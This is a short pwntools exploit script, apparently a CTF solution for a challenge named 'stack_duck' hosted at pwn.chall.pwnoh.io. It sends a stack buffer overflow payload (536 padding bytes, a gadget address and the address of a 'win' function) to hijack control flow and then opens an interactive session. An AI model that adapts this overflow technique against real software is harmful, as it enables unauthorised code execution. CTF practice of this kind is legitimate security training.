from pwn import *
import time

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

e = ELF("stack_duck")
def sobbing(r):
    for _ in range(29):
        r.recvuntil("Twitter Employee Performance Review")
        r.sendline(b"1")
        r.sendline(b"lol")
        r.recvuntil("length.\n")

def solve(r):
    r.recvuntil("Twitter Employee Performance Review")
    r.sendline(b"1")
    r.send(b"\x00" * 536 + p64(0x401194) + p64(e.symbols['win']))
    r.recvuntil("length.\n")

def run():
    # r = process("stack_duck")
    # # gdb.attach(r, gdbscript="""
# # c
# b *0x4011ea
    # # b *0x4011f9
    # """)
    r = remote("pwn.chall.pwnoh.io", 13386)

    try:
        sobbing(r)
        solve(r)
        # r.sendline("id")
        # r.recvline()
        r.interactive()
        r.close()
    except Exception:
        try:
            r.close()
        except Exception:
            pass

while True:
    run()
    break

